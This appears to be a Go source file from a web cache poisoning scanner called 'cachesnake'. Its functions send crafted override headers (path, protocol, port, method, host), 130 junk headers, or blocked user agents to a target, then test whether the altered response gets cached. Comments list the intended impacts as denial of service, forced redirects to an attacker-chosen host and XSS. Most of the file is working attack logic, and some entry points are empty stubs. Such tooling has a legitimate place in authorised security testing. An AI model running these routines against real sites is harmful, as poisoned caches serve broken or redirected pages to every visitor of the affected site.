package cachesnake

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func RunSpecificAttacks(target *AttackTarget, timeout time.Duration, backoff time.Duration) SpecificAttackResult {
	//Setup HTTP context
	net_ctx := HttpContext{}

	net_ctx.Client = &fasthttp.Client{
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		ReadTimeout:                   timeout,
		Name:                          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
	}

	net_ctx.Request = fasthttp.AcquireRequest()
	net_ctx.Response = fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(net_ctx.Request)
	defer fasthttp.ReleaseResponse(net_ctx.Response)

	//Setting Up the result object
	result := SpecificAttackResult{
		Target:      target,
		VulnList:    make([]Vuln, 0, 10),
		TimeStarted: time.Now(),
	}

	//Run the attacks & aggregate results
	//if t.cookie_search_only {

	//}

	//Note the time & return
	result.TimeStopped = time.Now()
	return result
}

// Path override associated decision function
func pathOverrideDecisionFunc(_ [][]string, target *AttackTarget, response *fasthttp.Response) bool {
	return response.StatusCode() != target.InitialResponse.StatusCode()
}

// Attempt to cause a 404
// Main Impact: DoS, Inappropriate Content displayed.
func RunPathOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(PathOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{PathOverrideHeaders[i], "/404doesntexist"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          pathOverrideDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Protocol override associated decision function
func protoOverrideDecisionFunc(_ [][]string, target *AttackTarget, response *fasthttp.Response) bool {
	return (response.StatusCode() != target.InitialResponse.StatusCode()) && (response.StatusCode() >= 301 && response.StatusCode() <= 308)
}

// Attempt to cause a redirect
// Main Impact: DoS, possible redirect
func RunProtoOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(ProtocolOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{ProtocolOverrideHeaders[i], "http"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          protoOverrideDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a redirect
// Main Impact: DoS, possible permenant redirect
func RunPortOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(PortOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{PortOverrideHeaders[i], "80"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          pathOverrideDecisionFunc,
		//we use the same decision function as path override
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause an error page through too many headers
// Main Impact: DoS
func RunLargeHeaderCount(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//Setup the request URL & method
	net_ctx.Request.SetRequestURI(target.TargetURL)
	net_ctx.Request.Header.SetMethod("GET")

	//Set URL params & cache buster headers
	cache_buster := GenRandString(10)
	query_params := net_ctx.Request.URI().QueryArgs()
	query_params.Add("cachebuster", cache_buster)

	net_ctx.Request.Header.Set("Accept", "*/*, text/"+cache_buster)

	//Add persistent headers if any
	for _, h_v := range net_ctx.PersistentHeaders {
		net_ctx.Request.Header.Set(h_v[0], h_v[1])
	}

	//Set 130 random headers
	for i := 0; i < 130; i++ {
		net_ctx.Request.Header.Add("X-Random-Custom-Header", GenRandString(15))
	}

	//Send the request with the header
	err := net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
	if err != nil {
		return false, nil
	}

	//Note the result with the headers present
	result_with_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

	//No need for a second request if we don't have an error page in the first place
	if !result_with_header {
		return false, nil
	}

	//Remove headers
	net_ctx.Request.Header.Del("X-Random-Custom-Header")

	//Resend the request without the headers
	err = net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
	if err != nil {
		return false, nil
	}

	//Note result without the header present
	result_without_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

	//The result is cached only if both tests are true
	return result_with_header && result_without_header, nil
}

// Method override associated decision function
func methodOverrideDecisionFunc(_ [][]string, target *AttackTarget, response *fasthttp.Response) bool {
	return len(response.Body()) <= 2 && len(target.InitialResponse.Body()) > 2
}

// Attempt to cause a HEAD response
// Main Impact: DoS
func RunMethodOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(MethodOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{MethodOverrideHeaders[i], "HEAD"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          methodOverrideDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Permanent redirect associated decision function
func permaRedirectDecisionFunc(_ [][]string, _ *AttackTarget, response *fasthttp.Response) bool {
	if response.StatusCode() > 308 || response.StatusCode() < 301 {
		return false
	}
	response.Header.EnableNormalizing()
	return strings.Contains(string(response.Header.Peek("location")), "elbo7")
}

// Attempt to cause a permanent redirect
// Main Impact: Redirect, XSS
func RunPermaRedirect(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	// WE WON'T CHECK IF IT'S A REDIRECT: because maybe some persistent headers turn the response into a redirect
	//If not redirect there's nothing to do
	// if target.InitialResponse.StatusCode() > 308 || target.InitialResponse.StatusCode() < 301 {
	// 	return false, nil
	// }

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], "www.elbo7.com"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          permaRedirectDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause an error page through banned user agent
// Main Impact: DoS
func RunEvilAgent(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	result := make([]string, 0, 2)

	for _, ua := range EvilUserAgents {
		//Reset request & response objects
		net_ctx.Request.Reset()
		net_ctx.Response.Reset()

		//Setup the request URL & method
		net_ctx.Request.SetRequestURI(target.TargetURL)
		net_ctx.Request.Header.SetMethod("GET")

		//Set URL params & cache buster headers
		cache_buster := GenRandString(10)
		query_params := net_ctx.Request.URI().QueryArgs()
		query_params.Add("cachebuster", cache_buster)

		net_ctx.Request.Header.Set("Accept", "*/*, text/"+cache_buster)

		//Add persistent headers if any
		for _, h_v := range net_ctx.PersistentHeaders {
			net_ctx.Request.Header.Set(h_v[0], h_v[1])
		}

		//Set Evil User-agent
		net_ctx.Request.Header.SetUserAgent(ua)

		//Send the request with the header
		err := net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
		if err != nil {
			return false, nil
		}

		//Note the result with the headers present
		result_with_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

		//If no change move on to the next user-agent
		if !result_with_header {
			continue
		}

		//Resend the request without the headers
		err = net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
		if err != nil {
			return false, nil
		}

		//Note result without the header present
		result_without_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

		if result_without_header {
			result = append(result, ua)
		}
	}

	//Finally return the result if any
	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Host override associated decision function
func hostOverrideDecisionFunc(header_value_pairs [][]string, target *AttackTarget, response *fasthttp.Response) bool {
	if target.InitialResponse.StatusCode() != response.StatusCode() {
		return true
	}
	// we'll only consider the random token in the middle ('www.token.com')
	if strings.Contains(string(response.Body()), strings.Split(header_value_pairs[0][1], ".")[1]) {
		return true
	}

	return false
}

// Attempt to cause a Host override
// Main Impact: DoS, XSS
func RunHostOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//Prepare headers & header bin search args
	random_host := "www." + GenRandString(16) + ".com"
	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], random_host}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          hostOverrideDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Port Dos associated decision function
func portDosDecisionFunc(_ [][]string, _ *AttackTarget, response *fasthttp.Response) bool {
	if response.StatusCode() > 308 || response.StatusCode() < 301 {
		return false
	}
	response.Header.EnableNormalizing()
	return strings.Contains(string(response.Header.Peek("location")), ":1337")
}

// Attempt to cause a Port dos
// Main Impact: DoS
func RunPortDos(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	// WE WON'T CHECK IF IT'S A REDIRECT: because maybe some persistent headers turn the response into a redirect
	//If not redirect there's nothing to do
	// if target.InitialResponse.StatusCode() > 308 || target.InitialResponse.StatusCode() < 301 {
	// 	return false, nil
	// }

	//Prepare headers & header bin search args
	uri_obj := fasthttp.AcquireURI()
	uri_obj.Parse(nil, []byte(target.TargetURL))
	target_host := string(uri_obj.Host()) + ":1337"
	defer fasthttp.ReleaseURI(uri_obj)

	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], target_host}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          portDosDecisionFunc,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

func RunCookieSearch() {

}
